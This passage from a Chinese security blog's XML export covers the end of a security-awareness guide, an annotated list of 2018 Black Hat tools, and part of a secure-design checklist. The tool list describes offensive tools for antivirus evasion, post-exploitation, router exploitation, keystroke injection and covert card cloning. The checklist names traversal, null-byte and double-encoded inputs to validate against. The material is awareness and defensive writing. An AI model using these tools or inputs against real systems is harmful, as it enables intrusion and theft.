监控摄像头直播某视频直播网站引发热议，在该网站上可以看到全国各地甚至国外的监控摄像头的免费直播，包括街景、餐厅、商店、办公室，甚至市民家中情况。 手机摄像头拍照vivo NEX手机开卖，“隐藏式升降式摄像头”引热议。在QQ浏览器中打开携程网站（APP权限开启），vivoNEX的前置摄像头突然自动升了起来，然后默默“扫描”了一眼再缩回去。 预防方案： 不用摄像头的时候，盖住摄像头 不在摄像头范围内，泄露账户密码等隐私信息 定期对电脑进行扫描并及时更新杀毒软件的补丁 九、网页内嵌恶意代码事件 网页内嵌恶意代码事件是指蓄意制造、传播网页内嵌恶意代码，或是因受到网页内嵌恶意代码影响而导致的信息安全事件。网页恶意代码(又称“网页病毒”)是利用网页来进行破坏的病毒。当用户登录某些含有网页病毒的网站时，网页病毒便被悄悄激活，这些病毒一旦激活，可以利用系统的一些资源进行破坏。 影响： 各种可能的负面后果包括：IE默认搜索引擎被修改、系统启动时弹出广告信息、营销诈骗、信息泄露。 案例： 知名网站的广告被“挂马攻击”国内多家知名软件、网站的广告页面遭到病毒团伙的“挂马攻击”只要用户访问该页面，即会触发浏览器漏洞。 恶意代码注入合法网站Websense安全实验室监测到一场大规模恶意代码注入攻击正在不断袭击合法网站，已经有上万个合法网站受到攻击，无数的Web用户受到感染。 网站感染按键记录器WordPress 网站感染了按键记录器。恶意程序会记录密码，以及管理员或访客输入的任何内容。恶意程序除了安装按键记录器还，还安装了挖矿脚本，利用访客的计算机挖掘数字货币。 预防方案： 安装杀毒软件以及防火墙 定期对电脑进行扫描并及时更新杀毒软件的补丁 不上不熟悉以及引发安全警报的网站 十、信息篡改事件 信息篡改事件是指在未经授权的情况下，将信息系统中的信息更换为攻击者所提供的信息而导致的信息安全事件。信息篡改事件通常体现在网页、商务数据、金融数据、个人信息等保存在数据库中的资料被人为修改，从中牟利，例如数据篡改、网页篡改等。攻击者获取受害网站权限或个人信息的方法都很常见，包括SQL注入和口令盗取，其中最常见的就是文件包含漏洞。 影响： 各种可能的负面后果包括：访问控制失效、个人信息泄露、财产损失。 案例： 银行存款被篡改俄罗斯一安全公司实验室介绍了他们的一些调查结果，表明一个或多个黑客群体针对至少140 家银行和组织进行了这种攻击，旨在盗取凭证和金钱。 政府网站被篡改江苏警方奔赴马来西亚打掉一个由四人组成的黑客团伙，个别政府网站遭黑客非法侵入，会被链接到境外的赌博网站。 虚拟货币客户端被篡改Myetherwallet（MEW）是网络上最受欢迎的以太坊钱包客户端，很不幸其在北京时间4月24日晚9点遭受DNS劫持攻击。许多用户报告缺失资金，造成经济损失。 预防方案： 重要信息和有价值的资料应定期备份 不要把存款、股票等有价证券放在同一个平台 十一、信息丢失事件 信息丢失事件是指因误操作、人为蓄意或软硬件缺陷等因素导致信息系统中的信息丢失而导致的信息安全事件。此类事件多由于服务端被攻击或人为失误造成，会在一定程度上影响公众生活。 影响： 各种可能的负面后果包括：财产经济损失等。 案例： 误操作，移动用户数据丢失因华为误操作导致广西80万移动用户数据丢失一事，华为已经被中国移动处以5亿罚款，同时中国移动已经展开全国范围的系统大排查。 苹果手机读取权限漏洞苹果macOS系统曾经被曝光允许任何人通过客人账户获得该设备的所有读取权限。不过好在苹果及时做出了补救措施。但事情没过多久，又有一位用户发现了类似的漏洞。 数据库被删除数据，以备份勒索数据库被黑并遭勒索，犯罪分子利用数据库配置漏洞进行未授权访问、拷贝、删除数据库内容，并以备份数据威胁受害者、索要赎金。 预防方案： 重要信息和有价值的资料应定期备份 定期对电脑进行扫描并及时更新杀毒软件的补丁 十二、措施 类别 初级措施 高级措施 系统安装 1.安装最新版正版操作系统2.启用系统防火墙3.安装系统补丁4.一定要设密码（用户名/密码）5.安装杀毒软件，用杀毒软件做全盘扫描 1.取消非必要授权2.设备自带防护等级设置为“高” 数据保护 1.定期备份文件2.使用office的加密功能保护文档 1.多因子验证 正确使用密码 1.不使用已知不安全密码或常见密码2.最好不要名字、生日、电话号码等3.不要一个密码通用所有帐号4.设置的密码一定要让自己记住 1.密码应该不少于8个字符2.同时包含多种类型的字符 第三方软件管理 1.每种功能的软件尽量选择自己熟悉的一种安装，不要重复安装2.尽量选择规模较大的软件公司出品的第三方软件3.使用正版的第三方软件4.发现第三方软件提示要更新时，请尽快安装 1.随时关注相关软件的官方网站，发现最新版本及时安装2.确认长时间不需要使用的软件请尽快卸 邮件安全 1.如果你不能确认你的邮件是合法并安全的，不要发送2.不要打开陌生人发来的邮件附件，也不要点击邮件中的链接3.不要轻易在网站上留你的公司邮箱或重要私人邮箱4.如果留取你的邮件地址不是获取服务所必需的，不要留取自己的邮件地址 1.通过邮件发送公司机密/敏感信息、个人隐私信息、或信用卡数据等，此类数据需要保护，即加密后才能发送2.创建不重要的邮件帐号，用于一些网站注册和邮件列表 无线安全 1.区分在家登陆和公共场合的登陆2.不要使用不受信的无线网络，使用公有的无线网络传输隐私信息时一定要加密传输3.最好把WiFi连接设置为手动 1.如果不使用无线，带无线功能的笔记本和手机设备在工作区域应该关闭无线功能，避免攻击者通过设备的无线接入内网 智能终端安全 1.不要随意将移动终端连接到内部网络的设备上，哪怕仅仅是充电2.不要随便安装不受信的app3.不用电脑时，一定要关机4.合理处置旧手机 1.移动终端上存储的隐私信息尽可能的加密存储 移动存储介质 1.不使用未知来源的移动存储介质2.使用移动存储介质时，先进行扫描杀毒3.请尽量避免工作移动存储介质和私人的移动存储介质交叉使用 1.对于安全要求较高的设备，应该仅允许使用特定的移动存储介质2.敏感信息如果要存储在移动介质上，请加密后再存储，并妥善保管该介质。 购物安全 1.建议在大型的网购平台进行网购，不要轻易相信各种打着打折，优惠的旗号 1.在登录购物网站时要核实网站的域名是否正确。谨慎点击商家从即时通讯工具上发送的支付链接 隐私安全 1.要在身份证复印件上加添加用途备注2.不要随意在各种网站上留个人信息3.在留取个人信息前仔细阅读网站的隐私保护声明4.不要总把私人账号随意借给别人使用5.平时不要习惯乱用他人的电脑登陆6.登录账号输入密码的时候注意周围是否有人盯着你的输入7.重要的账号在公共场所登陆后要注意退出8.妥善处置快递单、车票、购物小票等包含个人信息的单据9.不在微博、群聊中透露个人信息10.慎重参加网上调查活动 1.安全意识、使用习惯是首要 预防诈骗 1.不要轻易相信别人，尤其是在网络中2.不要随意点击别人发过来的网页链接，尤其是在邮件和即时通讯软件中3.能够自己输入的网址尽量自己输入，而不要直接点击发过来的链接4.邮件中涉及到修改密码的链接不要轻易点击5.在网络上涉及银行卡有关的操作一定要慎重，要仔细查看相关网站的信息（证书、域名等）6.管理员一般不会询问用户的密码，不管在何种场合下（邮件、论坛等） 1.安全意识、使用习惯是首要]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>SDL</tag>
        <tag>培训</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018BlackHat工具]]></title>
    <url>%2FTools%2F2018BlackHat%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[1.Android，iOS和移动黑客 Vulnerable iOS app: Swift version易受攻击的IOS应用程序（DVIA）旨在为学生、移动安全爱好者和专业人士等提供的一个练习他们的IOS渗透测试技能的平台。目前该程序拥有以下漏洞： 1.本地数据存储 2.越狱检测 3.过度授权 4.运行操作 5.防钩子/调试 6.二进制防护 7.指纹/面部识别绕过 7.钓鱼 9.旁路数据泄露 10.IPC问题 11.加密破环 12.Webview问题 13.网络层安全 14.应用程序修补 15.内存中敏感信息 https://github.com/prateek147/DVIA-v2 2.代码评估 OWASP dependency checkDependency-Check是一种软件组合分析（SCA）工具，它试图检测项目依赖项中包含的公开披露的漏洞。它通过确定给定依赖项是否存在公共平台枚举（CPE）标识符来完成此操作。如果找到，它将生成链接到相关CVE条目的报告。 https://github.com/jeremylong/DependencyCheck Cougar scanPuma Scan是一款.NET软件安全代码分析工具，可在开发团队编写代码时提供实时，持续的源代码分析。在Visual Studio中，漏洞会立即显示在开发环境中作为拼写检查和编译器警告，从而防止安全漏洞进入您的应用程序。Puma Scan还集成到构建中，以便在编译时提供安全性分析。 https://github.com/pumasecurity/puma-scan 3.加密 DeepViolet: SSL / TLS scanning API and toolsDeepViolet是一个用Java编写的TLS / SSL扫描API。该工具支持命令行和图形界面两种使用方式，这两种方式都可用于扫描HTTPS Web服务器以检查服务器证书信任链，撤销状态，检查挂起到期的证书，弱签名算法等等。 https://github.com/spoofzu/DeepViolet 4. 数据取证和事件响应 Beginner to expertBro是一种被动的开源网络流量分析器。它主要是一个安全监视器，可以检查链路上的所有流量，以查看可疑活动的迹象。然而，更一般地，Bro支持甚至在安全域之外的各种流量分析任务，包括性能测量和帮助解决问题。 https://github.com/bro/bro CyBot: Open Source Threat Intelligence ChatbotCyBot是一款开源的威胁情报聊天机器人。用户可以向CyBot提出简单的问题，甚至与其他人员分享结果，而不是去各种网站或仪表板进行研究，这种能力现在是免费的，并且正在积极开发中。 https://github.com/CylanceSPEAR/CyBot LogonTracerLogonTracer是一款用于分析Window活动目录事件日志来调查恶意登录的分析工具。LogonTracer将登录相关事件中的主机名（或IP地址）和帐户名关联起来，并将其显示为图形。这样，就可以看到登录尝试发生在哪个帐户以及使用了哪个主机。 https://github.com/JPCERTCC/LogonTracer Rastrea2r (reload!): Collect and hunt IOC with Gusto and Stylerastrea2r是一个多平台开源工具，允许事件响应者和SOC分析师对可疑系统进行分类，并在几分钟内搜索数千个端点上的妥协指标（IOC）。如果要从远程系统（包括内存转储）解析和收集感兴趣的工件，rastrea2r可以跨多个端点执行sysinternal、系统命令和其他第三方工具（包括自定义脚本），将输出结果集中保存方便进行自动或手动分析。通过使用客户端/服务器RESTful API，rastrea2r还可以使用YARA规则在多个系统上搜索磁盘和内存上的IOC。 https://github.com/rastrea2r/rastrea2r RedHunt OS (VM): Virtual machine for adversary emulation and threat searchRedHunt旨在通过集成攻击者的武器库以及防御者的工具包来积极识别您环境中的威胁，从而成为一站式商店，满足您的所有威胁模拟和威胁搜索需求。 https://github.com/redhuntlabs/RedHunt-OS 5.反制工具 AVET: AntiVirus Evasion ToolAVET是一种AntiVirus Evasion工具，旨在使测试人员的更加轻松的结构病毒文件，更有针对性的设计防病毒方案。 https://github.com/govolution/avet DSP: Docker Security PlaygroundDocker Security Playground主要功能有以下几点： 1.创建网络和网络安全方案，便于了解所有网络协议、规则和安全问题 2.学习渗透测试技术 3.更加灵活地管理docker-compose项目 https://github.com/giper45/DockerSecurityPlayground hideNsneak: Attack Confusion FrameworkhideNsneak通过提供快速部署，管理和删除各种云服务的界面，帮助管理渗透测试人员的攻击基础架构。包括虚拟机，域前端，Cobalt Strike服务器，API网关和防火墙。 https://github.com/rmikehodges/hideNsneak MerlinMerlin是一种后期利用工具，可以轻松交叉编译以便在任何平台上运行命令，实现对主机的控制。 https://github.com/Ne0nd0g/merlin RouterSploitRouterSploit Framework是一个专用于嵌入式设备的开源开发框架。它拥有以下渗透测试模块： 1.exploits - 利用已识别漏洞的模块 2.creds - 用于测试网络服务凭证的模块 3.scanners - 检查目标是否容易受到攻击的模块 4.payloads - 负责为各种体系结构和注入点生成有效载荷的模块 5.generic - 执行通用攻击的模块 https://github.com/threat9/routersploit 6.硬件/嵌入式 ChipWhispererChipWhisperer是一个致力于硬件安全研究的开源工具链。该工具链由几层开源组件组成： 1.硬件：ChipWhisperer使用一个捕获板和一个目标板。ChipWhisperer-Lite捕获板和许多目标板的原理图和PCB布局是免费提供的。 2.固件：ChipWhisperer硬件上使用三个独立的固件。捕获板具有USB控制器（在C中）、用于高速捕获的FPGA（在Verilog中）和开源固件。此外，目标设备有自己的固件; 此存储库包含许多针对不同目标的固件示例。 3.软件：ChipWhisperer软件由用于控制硬件的捕获程序和用于处理捕获数据的分析器程序组成。 https://github.com/newaetech/chipwhisperer JTAGulator: Uncover the Achilles heel of hardware securityJTAGulator是一款可帮助识别目标设备上测试点，过孔或元件焊盘的OCD连接的开源硬件工具。 https://github.com/grandideastudio/jtagulator Micro-Renovator: Bring the processor firmware into the codeMicroRenovator提供了一种部署处理器微码的机制，该机制独立于制造商和操作系统提供的更新，通过添加自定义EFI启动脚本，该脚本在操作系统运行之前加载微码。这使操作系统内核能够检测更新的微码并启用，从而修复幽灵漏洞。 https://github.com/syncsrc/MicroRenovator TumbleRF: RF Blur becomes easyTumbleRF是一个模糊测试框架，用于构建面向RF模糊测试的应用。TumbleRF旨在通过提供API以跨协议，无线电和驱动程序统一这些技术来实现RF模糊测试。 https://github.com/riverloopsec/tumblerf Walrus: Make the most of your card cloning deviceWalrus是一款适用于非接触式卡片克隆设备的Android应用程序，如Proxmark3和Chameleon Mini。使用Google Pay风格的简单界面，可以将访问控制卡读入钱包，以便稍后编写或模拟。Walrus专为红队参与期间的物理安全评估人员而设计，支持基本任务，如读卡，写入和仿真，以及特定于设备的功能，如天线调谐和设备配置。诸如位置标记之类的更高级功能使得处理多个目标变得容易，而批量读取允许在接近目标时秘密地捕获多个卡。 https://github.com/TeamWalrus/Walrus 7.物联网 Scalable Dynamic Analysis Framework for IoT DevicesDECAF是一个基于QEMU的二进制分析平台。这也是DroidScope动态Android恶意软件分析平台的基础。支持：即时虚拟机内部审计、精确无损的内核污染、事件驱动的编程接口、动态设备管理等功能。 https://github.com/sycurelab/DECAF BLE CTF projectBLE CTF可以帮助用户学习蓝牙低功耗客户端和服务器交互的核心概念，从而学习如何通过蓝牙入侵。 https://github.com/hackgnar/ble_ctf WHID Syringe and WHID Elite: Next Generation HID Aggressive DeviceWHID注入器允许通过Wi-Fi将键入信息发送到目标机器。目标将Ducky识别为标准HID键盘和串行端口，从而允许远程执行目标上的交互式命令和脚本。 https://github.com/whid-injector/WHID 8.恶意软件防御 Provides advanced deep learning analysis platform for every security researcher这是一个用于演示安全研究机器学习即服务（MLaaS）的Web平台。它有一个机器学习（ML）管道来构建和调整模型。它还有一个演示对抗性ML和对策的门户。 https://github.com/intel/Resilient-ML-Research-Platform EKTotalEKTotal是一个可以自动分析Drive-by Download攻击的流量的集成分析工具。它可以识别四种类型的漏洞利用工具包，如RIG和Magnitude，以及十多种类型的攻击方式，如Seamless和Fobos。EKTotal还可以提取漏洞利用代码和恶意软件。 https://github.com/nao-sec/ektotal Firmware Audit: Platform Firmware Security Automation for Blue Teams and DFIR固件审核（fwaudit）是一个平台固件测试实用程序。它运行测试并收集有关系统固件，日期和哈希输出的诊断和安全信息，以用于取证和事件响应。 https://github.com/PreOS-Security/fwaudit MaliceIOVirusTotal的免费开源版本 https://github.com/maliceio/malice Goal — see MacOS Security ToolsObjective-See旨在提供永久免费并且简单而有效的OS X安全工具。 https://github.com/objective-see 9.恶意软件进攻 BloodHound 1.5BloodHound是一个单页的Javascript Web应用程序，构建在Linkurious之上，使用Electron编译，其中一个Neo4j数据库由PowerShell摄取器提供。BloodHound使用图论来揭示Active Directory环境中隐藏的且通常是非预期的关系。攻击者可以使用BloodHound轻松识别高度复杂的攻击路径。防御者可以使用BloodHound来识别和消除那些相同的攻击路径。蓝队和红队都可以使用BloodHound轻松深入了解Active Directory环境中的权限关系。 https://github.com/BloodHoundAD/BloodHound 10.网络攻击 armoryArmory是一种用于从许多工具中获取大量外部和发现数据，将其添加到数据库并关联所有相关信息的工具。它旨在从各种工具中获取信息用于其他工具。 https://github.com/depthsecurity/armory Chiron: An advanced IPv6 security assessment and penetration testing frameworkChiron是一个IPv6安全评估框架，用Python编写并使用Scapy。它由以下模块组成： 1.IPv6扫描程序 2.IPv6本地链接 3.IPv4到IPv6代理 4.IPv6攻击模块 5.IPv6代理 https://github.com/aatlasis/Chiron DELTA: SDN Security Assessment FrameworkDELTA是一种渗透测试框架，可为不同的测试用例重新生成已知的攻击方案。该框架还提供了通过使用模糊测试技术在SDN中发现未知安全问题的能力。 https://github.com/OpenNetworkingFoundation/DELTA Mallet: Intercepting agent for any protocolMallet是一种更为通用的用于为任意协议创建代理的工具。 https://github.com/sensepost/mallet PowerUpSQL: PowerShell Toolkit for attacking SQL Server in an enterprisePowerUpSQL包括支持SQL Server发现，弱配置审计，规模特权升级以及OS命令执行等后期利用操作的功能。它旨在用于内部渗透测试和红队测试，此外管理员还可以用它快速清点其ADS域中的SQL Server，并执行与SQL Server相关的常见威胁搜索任务。 https://github.com/NetSPI/PowerUpSQL WarBerryPiWarBerryPi在红队中被用作硬件植入设备。只需找到一个网络端口并将其接入，便可以在短时间内尽可能多地获取信息。 https://github.com/secgroundzero/warberry 11.网络防御 ANWI (New Wireless IDS): $5 WIDSANWI是一种新型无线入侵检测系统，它基于低成本的Wi-Fi模块（ESP8266），可以部署在覆盖区域的物理周边。它使那些无法负担昂贵的WIDS解决方案的组织能够以很低的成本保护他们的网络。 https://github.com/SanketKarpe/anwi CHIRON: Home-based network analysis and machine learning threat detection frameworkCHIRON是基于ELK堆栈和机器学习威胁检测框架AKTAION的网络安全分析工具。CHIRON解析并显示来自P0f，Nmap和BRO IDS的数据。CHIRON专为家庭环境而设计，可让您更好地了解家庭互联网设备（物联网，电脑，手机，平板电脑等）存在的风险。 https://github.com/jzadeh/chiron-elk Cloud Security Suite: One-stop tool for AWS / GCP / Azure security auditing atCS Suite是用于审核AWS基础架构的安全状态的一站式工具。CS Suite利用当前的开源工具功能，并将其他缺失的检查添加到一个工具中更加便于管理。 https://github.com/SecurityFTW/cs-suite DejaVu: An open source spoofing frameworkDejaVu是一个开源欺骗框架。防御者可以使用它在不同VLAN的网络上战略性地部署多个交互式诱饵（HTTP服务器，SQL，SMB，FTP，SSH，客户端 - NBNS）。为了简化诱饵的管理，框架还提供了web管理界面，可用于从集中控制台有效地部署，管理和配置所有诱饵。记录和警报仪表板显示有关生成的警报的详细信息，并可进一步配置如何处理这些警报。 https://github.com/bhdresh/Dejavu 12.OSINT – 开源智能 DataSploit 2.0DataSploit是一款用于处理公开来源情报（OSINT）的辅助工具，具有以下功能： 1.对域名/电子邮件/用户名/IP进行检索，并从不同来源查找相关信息。 2.关联并处理结果，以统一的方式展示它们。 3.试图找出与目标相关的凭证，api-key，令牌，子域，域名历史，旧门户等。 4.对特定数据使用特定脚本自动收集OSINT。 5.对收集的数据进行有效性验证。 6.生成HTML、JSON或txt格式的报告。 https://github.com/DataSploit/datasploit Dradis framework: Learn how to reduce reporting time by halfDradis是一个专为InfoSec团队量身定制的开源协作框架，。 https://github.com/dradis/dradis-ce 13.逆向工程 Snake: Malware Storage ZooSnake是一个恶意软件存储容器。Snake旨在提供足够的信息，使分析师能够快速有效地选择最适合手头任务的工具。此外它还提供了从静态分析到与外部服务交互的各种功能。 https://github.com/countercept/snake 14.智能电网/工业安全 GRFICS: Graphic Realism Framework for Industrial Control SimulationGRFICS是用于工业控制模拟的图形框架，它使用Unity 3D游戏引擎图形来降低工业控制系统安全性的进入门槛。GRFICS为用户提供完整的虚拟工业控制系统（ICS）网络，支持常见攻击，包括命令注入，中间人和缓冲区溢出，并通过对3D可视化更加直观地展示攻击的影响。此外用户还可以通过使用强大的防火墙规则正确隔离网络或编写入侵检测规则来练习其防御技能。 https://github.com/djformby/GRFICS 15.漏洞评估 Robustness Toolbox for Machine Learning Modelsadversarial-robustness-toolbox一个致力于对抗性机器学习的工具箱。旨在帮助研究人员快速构建用于分析的攻击和防御方法的机器学习模型。它还提供了许多最新的攻击和防御类型。 https://github.com/IBM/adversarial-robustness-toolbox Android Dynamic Analysis Tool (ADA)这是一款基于安卓的动态分析工具 https://github.com/ANELKAOS/ada Archery: Open Source Vulnerability Assessment and ManagementArchery是一个开源漏洞评估和管理工具，可帮助开发人员和测量人员执行扫描和管理漏洞。Archery使用流行的开源工具对Web应用程序和网络执行全面扫描。它还执行Web应用程序动态验证扫描，并使用selenium覆盖整个应用程序。开发人员还可以利用该工具实现其DevOps CI / CD环境。 https://github.com/archerysec/archerysec BoofuzzBoofuzz是古老的Sulley模糊框架的一个分支和继承者。它修复了许多错误并且提升了可扩展性。 https://github.com/jtpereyda/boofuzz BTABTA是一个开源的Active Directory安全审计框架。能够帮助审计人员获取以下信息： 1.目标对象（计算机、用户帐户等）的权限 2.访问邮箱的权限 3.域管理员权限的帐户信息 4.扩展权限信息等 5.两个时间点之间AD发生的变化 https://github.com/airbus-seclab/bta Take advantage ofDeepExploit是与Metasploit链接的全自动渗透测试工具。DeepExploit标识目标服务器上所有已打开端口的状态，并使用机器学习以精确的方式进行漏洞攻击。它的主要特性有这几点：高效的漏洞利用、深入渗透、自学习和训练时间短。 https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit Halcyon IDE: for Nmap script developersHalcyon IDE可以快速轻松地开发Nmap脚本，以便在应用程序和基础架构上执行高级扫描。它是第一个专门为Nmap脚本开发发布的IDE。 https://github.com/s4n7h0/Halcyon SimpleRiskSimpleRisk是一款开源工具，它可以帮助安全专家们管控存在风险的管理行为。SimpleRisk向用户呈现了一个风险管理控制面板，上面显示了系统，团队和安全技术的状态以及正在进行中的风险化解项目。 https://github.com/simplerisk TROMMELTROMMEL可用于筛选嵌入式设备文件，以识别潜在的易受攻击的指标。 https://github.com/CERTCC/trommel 16.Web AppSec Take a look at NGINX’s ModSec 3.0: Software Web Application FirewallModSecurity是一个Web应用程序防火墙引擎，支持用户自定义配置和规则。 https://github.com/SpiderLabs/ModSecurity Astra: Automatic security testing of the REST APIAstra可以让安全工程师或开发人员用到开发流程中，他们可以在开发周期的早期检测和修补漏洞。Astra可以自动检测和测试登录和注销（Authentication API），因此任何人都可以轻松地将其集成到CICD通道中。 https://github.com/flipkart-incubator/Astra Burp Replicator: Replication of automated complex vulnerabilitiesReplicator是一个Burp扩展，可帮助开发人员重现渗透测试问题。渗透测试器生成一个包含报告结论的Replicator文件。测试人员将Replicator文件发送到客户端，就可以在Burp中打开该文件并复现问题。 https://github.com/PortSwigger/replicator OWASP offensive web testing frameworkWASP OWTF是一个专注于渗透和安全测试、OWASP测试（v3和v4）、OWASP Top 10、PTES和NIST等安全标准的Web测试框架。该工具高度可配置，任何人都可以在配置文件中轻松创建简单的插件或添加新测试，无需任何开发经验。 https://github.com/owtf/owtf OWASP JoomScan projectOWASP Joomla是一个开源漏洞扫描程序，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷。此外，OWASP JoomScan提供了用户友好的界面，并以文本和HTML格式输出报告。 https://github.com/rezasp/joomscan WSSATSSAT是一个开源Web服务安全扫描工具，它通过编辑配置文件提供动态环境来添加，更新或删除漏洞。此工具接受WSDL地址列表作为输入文件，针对每个服务进行安全漏洞静态和动态测试。 https://github.com/YalcinYolalan/WSSAT]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全设计Checklist]]></title>
    <url>%2FSecurity%2F%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1Checklist%2F</url>
    <content type="text"><![CDATA[一、输入验证 校验跨信任边界传递的不可信数据(策略检查数据合法性，含白名单机制等)格式化字符串时，依然要检验用户输入的合法性，避免可造成系统信息泄露或者拒绝服务 禁止向Java Runtime.exec()方法传递不可信、未净化的数据(当参数中包含空格，双引号，以-或者/符号开头表示一个参数开关时，可能会导致参数注入漏洞)，建议如果可以禁止JVM执行外部命令，未知漏洞的危害性会大大降低，可以大大提高JVM的安全性。 验证路径之前应该先将其标准化为实际路径（特殊的文件名，比如“..”，symbolic links、hard links、shortcuts） 从ZipInputStream提取文件，如果不在程序预期计划的目录之内时，应拒绝将其提取出来，或者将其提取到一个安全的位置 从ZipInputStream提取文件，若解压之后的文件大小超过一定的限制时，必须拒绝将其解压 在处理以前，验证所有来自客户端的数据，包括：所有参数、URL、HTTP头信息（比如：cookie名字和数据值），确定包括了来自 JavaScript、Flash 或其他嵌入代码的post 返回信息 如果任何潜在的危险字符必须被作为输入，请确保您执行了额外的安全控制，比如：输入转义、输出编码、特定的安全 API等。部分常见的危险字符，包含但不限于： &lt; &gt; “ ‘ % ( ) &amp; + \ \’ \” 如果您使用的标准验证规则无法验证下面的输入，那么它们需要被单独验证，比如验证空字节 (%00)； 验证换行符 (%0d, %0a, \r, \n)； 验证路径替代字符“点-点-斜杠”（../或 ..\）；如果支持 UTF-8 扩展字符集编码，验证替代字符： %c0%ae%c0%ae/ (使用规范化验证双编码或其他类型的编码) 严格验证来自重定向输入的数据（一个攻击者可能向重定向的目标直接提交恶意代码，从而避开应用程序逻辑以及在重定向前执行的任何验证） 验证数据类型 验证数据范围 验证数据长度 二、输出编码 为每一种输出编码方法采用一个标准的、已通过测试的规则 通过语义输出编码方式，对所有从服务端返回到客户端的数据进行编码。比如HTML编码、URL编码等，编码形式需根据具体的应用场景选择 除非对目标编译器是安全的，否则请对所有字符进行编码 针对 SQL、XML 和 LDAP 查询，语义净化所有不可信数据的输出 对于操作系统命令，净化所有不可信数据输出 异常处理 禁止在异常中泄露敏感信息（敏感数据的范围应该基于应用场景以及产品威胁分析的结果来确定。典型的敏感数据包括口令、银行账号、个人信息、通讯记录、密钥等） 禁止在异常中泄露应用服务器的指纹信息（如版本，路径，架构） 方法发生异常时要恢复到之前的对象状态（业务操作失败时，进行回滚业务；或者避免去修改对象状态，维持对象状态一致性） I/O操作- 临时文件使用完毕应及时删除 不要将Buffer对象封装的数据暴露给不可信代码 在多用户系统中创建文件时指定合适的访问许可，以防止未授权的文件访问 当一个外部进程通过其输出流对外输出信息或错误时，必须及时清空其输出流，以防止输出流中的缓冲区被耗尽而导致外部进程被阻塞。 白名单控制共享目录操作文件权限，比如读/写/可执行权限 三、运行环境 不要使用危险的许可与目标组合（比如不要将AllPermission许可赋予给不信任的代码，不要将ReflectPermission许可和suppressAccessChecks目标组合使用，不要将java.lang.RuntimePermission许可与createClassLoader目标组合） 不要禁用JVM字节码验证，如果使用的字节码，如class文件被恶意篡改过，将会存在安全风险 建议监控平台不要对互联网开放，仅限于内网环境访问；如果监控平台存在远程执行漏洞，将会给所监控的应用带来安全风险 建议将所有安全敏感代码(例如进行权限控制或者用户名密码校验的代码)都放在一个jar包中 生产代码不能包含任何调试代码或接口 四、身份验证 除了那些特定设为“公开”的内容以外，对所有的网页和资源都要求进行身份验证，并正确设计身份验证功能 所有的身份验证过程必须在服务器后端上执行 在任何可能的情况下，建立并使用标准的、已通过安全测试的身份验证服务(比如 C4A) 所有的身份验证控制应当安全的处理未成功的身份验证，比如给出错误模糊提示，隐藏敏感信息 登录入口应具有防止暴力猜解及撞库猜解（利用已泄漏的密码字典进行批量登录尝试）的措施，超过设定失败次数需要启用锁定或图片随机码进行访问限制 采用https post请求方式传输身份验证的凭据信息 身份验证的失败提示信息采用模糊处理，比如可以使用“用户名或密码错误”，而不要使用“用户名错误”或者“密码错误”明确提示。 涉及敏感信息或功能的外部系统连接应配置身份验证功能，并进行有效身份验证控制 在执行关键操作（如个人信息密码修改操作）时，应对用户身份进行再次验证 为高度敏感或重要的交易账户使用多因子身份验证机制，如支付密码、短信验证码等 五、短信验证码 一次一用 发送频率控制（建议60s获取一次） 验证码有效期（建议60s内有效，发短信时进行友好提示） 复杂度（短信验证码建议6位数字） 安全提示：是否是个人自己操作等风险提示信息 在前端校验（客户端的校验只能作为辅助手段，很容易被绕过），必须使用服务端代码对输入数据进行最终校验 短信验证码需要限制频率使用，例如：每天一个手机号码只允许发送5次，防止被黑客恶意消耗短信 不同场景的短信验证码不可通用 单个短信验证码限制有效验证次数 验证码需要对应手机号不可通用 六、图形验证码 一次一用 验证码有效期(10分钟内有效，可根据场景兼容安全和体验灵活设置) 复杂度（4位及以上数字、字母交替），根据需要也可采用当下流行的拖拽验证码或计算值的验证方式 服务器端进行认证 从用户体验和安全角度出发，可设计为当用户输3次错误密码后自动弹出验证码输入框进行验证操作 七、密码管理 禁止使用私有或者弱加密算法（比如禁止使用DES，SHA1等，推荐使用AES: 128位，RSA: 2048位，DSA: 2048位） 采用基于哈希算法和加入盐值（salt）方式安全存储口令信息 密码输入框，可设计为显示密码和隐藏密码切换功能 密码重设和更改操作，需要进行二次合法身份验证 密码重设时，应对注册手机号和邮箱进行有效验证，链接只能发送到预先注册的邮件地址或预先绑定的手机号 临时密码和链接应设计一个短暂的有效期（比如5分钟），防止暴力破解 当密码重新设置时，应短信通知用户是否是本人在操作，告知安全风险 密码复杂度设置：建议8个字符以上，包含字母、数字及特殊字符等 密码设置场景中应具有密码复杂度检查功能 密码不能输出到日志和控制台 数据库连接配置中的用户密码要以加密的形式存储 建议设计密码定期修改提醒机制 八、会话安全 用户登出后应立即清理会话及其相关登录信息 注销功能应当完全终止相关的会话或连接 增加Cookie 安全性，添加“HttpOnly”和“secure”属性（当“secure”属性设置为true时表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在HTTPS 连接中被浏览器传递到服务器端进行会话验证，在 HTTP 连接中不会传递该信息，也就不会存在Cookie被窃取的问题；设置了”HttpOnly”属性，通过程序(JS脚本、Applet等)将无法读取到Cookie信息，这样也能减少XSS跨站脚本攻击风险） 会话cookie应设计有效期，超时后立即失效 当设计允许用户在多渠道终端同时登录时，建议应进行常用设备登录限制 为包含已验证的会话标识符的 cookie 设置域和路径，为站点设置一个恰当的限制值。默认cookie的域是当前域名，默认cookie的路径是当前页面的目录路径。如果想要跨域或者在其他的路径下访问cookie就必须要重新设置这两个属性，domain和path。 注销功能应当可用于所有受身份验证保护的网页 在平衡风险和业务功能需求的基础上，设置一个尽量短的会话超时时间。通常情况下，应当不超过几个小时。 不要在URL、错误信息或日志中暴露会话标识符，会话标识符应当只出现在http头信息中，不要将会话标识符以 GET 参数进行传递 定期生成一个新的会话标识符并周期性地使上一个会话标识符失效（这可以缓解那些原标识符被获得的特定会话劫持情况） 在身份验证的时候，如果连接从 HTTP 变为 